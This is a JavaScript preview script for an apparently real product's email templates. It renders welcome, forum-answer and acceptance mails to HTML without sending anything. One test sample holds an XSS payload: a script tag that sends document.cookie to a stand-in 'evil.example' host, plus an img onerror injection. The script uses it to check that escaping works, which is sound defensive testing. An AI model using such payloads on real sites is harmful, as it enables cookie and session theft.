/**
 * Render XENO's outbound emails to a file so a human can LOOK at them.
 *
 *   node scripts/preview-emails.mjs [outfile]
 *
 * 🔴 THIS SCRIPT SENDS NOTHING. It imports the template functions, calls them
 * with sample data, and writes HTML to disk. There is no transport, no API key
 * read, and no database handle anywhere in this file — `sendEmail` is never
 * imported. That is deliberate: a preview tool that could accidentally deliver
 * is a preview tool nobody should run, and "I only wanted to check it" is how
 * this workspace lost four products' release history once already.
 *
 * Why a tool and not a one-off: "show me what the email looks like" is a
 * question that gets asked every time a template changes, and rendering it by
 * hand each time invites rendering something that is not what production
 * sends. This calls the SAME `templates` object `sendEmail` calls.
 */

import { writeFileSync } from 'node:fs';
import emailService from '../src/server/services/emailService.js';

const { templates } = emailService;
const OUT = process.argv[2] || 'email-preview.html';

const THREAD = 'ONNX runtime crashes the Electron app on startup';
const URL = 'https://xenostudio.ai/forum/t/fc9f7bb6/onnx-runtime-crashes-the-electron-app-on-startup';
const UNSUB = 'https://xenostudio.ai/email/unsubscribe?e=you%40example.com&t=sample&category=forum';

/**
 * Samples chosen to exercise the cases that actually differ, not three copies
 * of the happy path:
 *   - a human answer               (the common case)
 *   - an AGENT answer with owner   (the case unique to this Forum)
 *   - acceptance                   (no excerpt, different shape entirely)
 *   - a very long body             (proves the 420-char clip, which is the
 *                                   only logic in answerBlock that can be wrong)
 */
const SAMPLES = [
  {
    label: 'Welcome — the first email anyone gets',
    note: 'The onboarding mail (shipped in dfc4f0f). Included here because it sets the house style every other template inherits, and because it is the one currently reaching real users — the Forum templates below are not wired to send yet.',
    render: () => templates.welcome({
      displayName: 'Alex',
      loginUrl: 'https://xenostudio.ai/auth',
      unsubscribeUrl: 'https://xenostudio.ai/email/unsubscribe?e=you%40example.com&t=sample',
    }),
  },
  {
    label: 'Answer from a human',
    note: 'The common case. The answer is IN the mail — a reader who is unblocked without clicking is the goal, not a lost pageview.',
    render: () => templates.forum_answer({
      displayName: 'Alex',
      threadTitle: THREAD,
      threadUrl: URL,
      authorName: 'Maria Chen',
      authorKind: 'human',
      excerpt: 'This is the onnxruntime-node binary being unpacked into the asar. Add it to asarUnpack in electron-builder.config.cjs:\n\n  "asarUnpack": ["**/node_modules/onnxruntime-node/**"]\n\nThe native .node file cannot be loaded from inside an asar archive, which is why it only fails in the packaged build and never in dev.',
      unsubscribeUrl: UNSUB,
    }),
  },
  {
    label: 'Answer from an AGENT',
    note: 'The case no other forum has. The reader is told a machine wrote this, and WHO operates it — the owner is who is accountable (SPEC §4.4).',
    render: () => templates.forum_answer({
      displayName: 'Alex',
      threadTitle: THREAD,
      threadUrl: URL,
      authorName: '@pixel-dev',
      authorKind: 'agent',
      authorOwner: 'Maria Chen',
      excerpt: 'Matched against docs/engineering-learnings.md — this is documented as "ONNX startup crash". The fix is asarUnpack for onnxruntime-node. Shipped in Pixel 0.6.1; if you are on 0.6.0 an update resolves it without any config change.',
      unsubscribeUrl: UNSUB,
    }),
  },
  {
    label: 'Agent with NO owner (fail-visible)',
    note: 'Should look WRONG. An agent whose owner is missing renders "operated by an unnamed owner" rather than passing as a bare name — the accountability chain must break loudly.',
    render: () => templates.forum_answer({
      displayName: 'Alex',
      threadTitle: THREAD,
      threadUrl: URL,
      authorName: '@unknown-bot',
      authorKind: 'agent',
      authorOwner: null,
      excerpt: 'Try reinstalling.',
      unsubscribeUrl: UNSUB,
    }),
  },
  {
    label: 'Your answer was accepted',
    note: 'The only reward the Forum gives. Note what is absent: no points, no score, no streak, no badge count (D4).',
    render: () => templates.forum_accepted({
      displayName: 'Maria',
      threadTitle: THREAD,
      threadUrl: URL,
      askerName: 'Alex',
      unsubscribeUrl: UNSUB,
    }),
  },
  {
    label: 'Long body — clipping',
    note: 'Proves the 420-character cap. Gmail clips around 102 KB and hides the rest, which would take the unsubscribe link with it — a compliance problem, not a cosmetic one.',
    render: () => templates.forum_reply({
      displayName: 'Alex',
      threadTitle: THREAD,
      threadUrl: URL,
      authorName: 'Sam Okonkwo',
      authorKind: 'human',
      excerpt: ('I hit this too and went down a long path before finding the real cause, so writing up everything I tried in case it helps someone searching later. '.repeat(9)),
      unsubscribeUrl: UNSUB,
    }),
  },
  {
    label: 'XSS attempt in a post body',
    note: 'A post body is user-authored markdown. It is ESCAPED, never rendered — email has no CSP, so interpolating it as HTML would be worse than the web view it mirrors.',
    render: () => templates.forum_reply({
      displayName: 'Alex',
      threadTitle: THREAD,
      threadUrl: URL,
      authorName: '<img src=x onerror=alert(1)>',
      authorKind: 'human',
      excerpt: 'Try this: <script>fetch("https://evil.example/"+document.cookie)</script> and also <a href="https://evil.example">click here</a>',
      unsubscribeUrl: UNSUB,
    }),
  },
];

/**
 * Escape for an `srcdoc` ATTRIBUTE.
 *
 * 🔴 `&` must go first, and getting this wrong is not cosmetic.
 *
 * srcdoc is an HTML attribute, so the browser HTML-decodes it once before the
 * iframe parses the result. The templates correctly emit `&lt;script&gt;` for a
 * hostile post body — but if only `"` is escaped here, that decodes back to a
 * real `<script>` tag and the iframe executes it. The preview would then run
 * the very payload it exists to prove is inert, and would report a passing
 * escape as a failing one.
 *
 * Escaping `&` first turns it into `&amp;lt;script&amp;gt;`, which decodes to
 * the literal text `&lt;script&gt;` — the iframe renders characters, not a tag.
 */
function forSrcdoc(html) {
  return html.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
}

const esc = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

const cards = SAMPLES.map(({ label, note, render }, i) => {
  const { subject, html } = render();
  return `
    <section class="panel">
      <div class="heading">
        <span class="heading-label">${esc(label)}</span>
        <span class="spacer"></span>
        <span class="idx">${String(i + 1).padStart(2, '0')}</span>
      </div>
      <div class="body">
        <p class="note">${esc(note)}</p>
        <div class="inbox">
          <div class="inbox-row">
            <span class="k">From</span>
            <span class="v">XENO &lt;noreply@xenostudio.ai&gt;</span>
          </div>
          <div class="inbox-row">
            <span class="k">Subject</span>
            <span class="v subj">${esc(subject)}</span>
          </div>
        </div>
        <div class="frame">
          <iframe title="${esc(label)}" sandbox="" loading="lazy" srcdoc="${forSrcdoc(html)}"></iframe>
        </div>
      </div>
    </section>`;
}).join('\n');

/*
 * The page chrome implements the LOCKED root DESIGN_SYSTEM.md rather than
 * inventing a look: layers of darkness, the cool-gray text ramp, white-alpha
 * interaction only (colour is semantic-only), rectangles with small radii —
 * no pills, no circles — and §3.1's panel anatomy, where a 34px heading bar
 * floats 4px above its body like a tab. A preview of XENO's product surface
 * should be built out of XENO's own vocabulary.
 *
 * Emitted WITHOUT doctype/html/head/body so the same file can be published as
 * an artifact (which supplies that skeleton) and still opens locally. One
 * output, no second copy to drift.
 */
writeFileSync(OUT, `<title>XENO Outbound Mail</title>
<style>
  :root {
    --page: #08080a; --surface: #18181b; --bar: rgba(0,0,0,0.90);
    --recess: #060608; --band: #0c0c0f;
    --t-primary: #ffffff; --t-body: #e5e5e9; --t-secondary: #a8a8b1;
    --t-muted: #79797f; --t-dim: #57575e;
    --b-subtle: rgba(255,255,255,0.05); --b-default: rgba(255,255,255,0.08);
    --b-strong: rgba(255,255,255,0.15);
    --ok: #3fb26b;
    --r: 6px; --r-sm: 3px; --h-bar: 34px;
    --ui: 'Inter','Segoe UI Variable Text','Segoe UI',system-ui,-apple-system,sans-serif;
    --mono: ui-monospace,'Cascadia Code','Cascadia Mono',Consolas,monospace;
    color-scheme: dark;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0; padding: 28px 20px 64px;
    background: var(--page); color: var(--t-body);
    font: 13px/1.55 var(--ui); -webkit-font-smoothing: antialiased;
  }
  .wrap { max-width: 940px; margin: 0 auto; display: flex; flex-direction: column; gap: 20px; }

  header { display: flex; flex-direction: column; gap: 8px; }
  h1 { margin: 0; font-size: 19px; font-weight: 600; color: var(--t-primary);
       letter-spacing: -0.01em; text-wrap: balance; }
  .lede { margin: 0; color: var(--t-secondary); max-width: 68ch; }
  code { font-family: var(--mono); font-size: 0.92em; color: var(--t-body); }

  /* Semantic, not decorative: this states a fact about safety. */
  .notsent {
    display: flex; align-items: baseline; gap: 8px;
    padding: 9px 12px; border: 1px solid var(--b-default);
    border-left: 2px solid var(--ok); border-radius: var(--r-sm);
    background: var(--band); color: var(--t-secondary);
  }
  .notsent strong { color: var(--t-body); font-weight: 600; }

  /* DESIGN_SYSTEM §3.1 — heading bar 4px above its body. */
  .panel { display: flex; flex-direction: column; gap: 4px; }
  .heading {
    height: var(--h-bar); flex-shrink: 0; display: flex; align-items: center; gap: 8px;
    padding: 0 12px; background: var(--bar);
    border: 1px solid var(--b-default); border-radius: var(--r);
  }
  .heading-label {
    color: var(--t-secondary); font-size: 10px; font-weight: 600;
    letter-spacing: 0.09em; text-transform: uppercase;
  }
  .spacer { flex: 1; }
  .idx { color: var(--t-dim); font-size: 11px; font-variant-numeric: tabular-nums; }
  .body {
    background: var(--surface); border: 1px solid var(--b-default);
    border-radius: var(--r); padding: 12px;
    display: flex; flex-direction: column; gap: 10px;
  }
  .note { margin: 0; color: var(--t-secondary); max-width: 78ch; }

  /* The inbox line — what actually lands in front of someone. */
  .inbox {
    display: flex; flex-direction: column; gap: 3px;
    padding: 9px 11px; background: var(--recess);
    border: 1px solid var(--b-default); border-radius: var(--r-sm);
  }
  .inbox-row { display: flex; gap: 10px; align-items: baseline; }
  .k { flex: 0 0 52px; color: var(--t-dim); font-size: 10px; font-weight: 600;
       letter-spacing: 0.09em; text-transform: uppercase; }
  .v { color: var(--t-secondary); font-family: var(--mono); font-size: 12px;
       word-break: break-word; }
  .subj { color: var(--t-primary); font-weight: 600; }

  .frame { border: 1px solid var(--b-subtle); border-radius: var(--r-sm);
           overflow: hidden; background: var(--page); }
  iframe { width: 100%; height: 600px; border: 0; display: block; }

  footer { color: var(--t-dim); border-top: 1px solid var(--b-subtle); padding-top: 14px; }
  @media (max-width: 620px) { .k { flex-basis: 44px; } iframe { height: 520px; } }
</style>

<div class="wrap">
  <header>
    <h1>XENO outbound email</h1>
    <p class="lede">Rendered from the same <code>templates</code> object that <code>sendEmail()</code>
       calls, so this is what would actually be delivered — not a mock-up of it.</p>
    <div class="notsent">
      <strong>Nothing was sent.</strong>
      <span>Generated by <code>scripts/preview-emails.mjs</code>, which never imports the transport.</span>
    </div>
  </header>

  ${cards}

  <footer>Ordered from what ships today to the hostile edge: the live welcome mail, a human
    answer, the agent answer unique to this Forum, a deliberately-visible failure, acceptance,
    clipping, and an injection attempt. Only the first is wired to send.</footer>
</div>`);

console.log(`Wrote ${SAMPLES.length} rendered emails to ${OUT} — nothing was sent.`);
